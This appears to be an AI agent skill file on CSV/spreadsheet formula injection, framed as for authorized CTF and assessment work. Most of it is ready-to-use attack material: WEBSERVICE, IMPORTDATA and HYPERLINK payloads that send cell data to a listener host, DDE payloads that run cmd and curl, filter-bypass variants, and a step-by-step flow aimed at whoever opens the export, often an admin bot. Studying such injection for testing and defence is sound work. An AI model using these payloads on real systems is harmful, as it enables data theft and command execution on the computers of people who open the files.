name: csv-formula-injection
description: CSV/spreadsheet formula injection (DDE) — when user-controlled data lands in an exported CSV/Excel/Sheets file, inject `=`/`+`/`-`/`@` formulas that execute on open (data exfil, remote fetch, command). Use on export/report/import features that feed spreadsheets.
---

# CSV Formula Injection

Authorized CTF/assessment use. When the app exports user input into a CSV/spreadsheet, a cell starting with `=`/`+`/`-`/`@` is interpreted as a FORMULA by Excel/LibreOffice/Sheets. The flag is often exfiltrated by a formula that fetches a remote URL on open.

## 1. The trigger characters

```
=   +   -   @
```
Cells starting with these are parsed as formulas (some only when the field is unquoted/leading). Test:
```csv
name,value
x,=1+1
x,+1+1
x,-1+1
x,@SUM(1+1)
```

## 2. Payloads (escalation order)

**Remote fetch (data exfil / SSRF-from-spreadsheet):**
```
=WEBSERVICE("http://YOUR_LISTENER/?c="&A1)              (Excel)
=IMPORTDATA("http://YOUR_LISTENER/")                     (Google Sheets)
=HYPERLINK("http://YOUR_LISTENER/?v="&A1,"x")
```
**Command execution (DDE, older Excel):**
```
=cmd|' /C calc'!A0
=cmd|'/C curl http://YOUR_LISTENER/'!A0
```
**Cell-reference exfil:** `=A1&"..."` concatenates other cells (steal adjacent data) — combine with a remote fetch: `=WEBSERVICE("http://YOUR_LISTENER/?d="&B2)`.

## 3. Bypass filters (when `=`,`+`,`-`,`@` are stripped)

```
"+"1+1           (quote before the sign)
'=1+1            (apostrophe — still formula in some apps)
\t=1+1           (tab before)
= 1+1            (space)
%0A=1+1          (newline)
```

## 4. Flow

1. Find a field that lands in an export/report (username, comment, address, note).
2. Inject `=WEBSERVICE("http://YOUR_LISTENER/")` into it.
3. Trigger the export → open the file (or wait for the admin bot to open it).
4. Your listener receives the request (or the concatenated data) → flag/impact.

## Cross-cutting
- **The payload fires on OPEN, not on save** — the victim is whoever opens the exported file (often an admin bot).
- **`=` + a remote-fetch function is the whole trick** — WEBSERVICE/IMPORTDATA/HYPERLINK turn a CSV cell into a fetch.
- Self-verify: your listener receives a hit when the file is opened before assuming the formula executed.
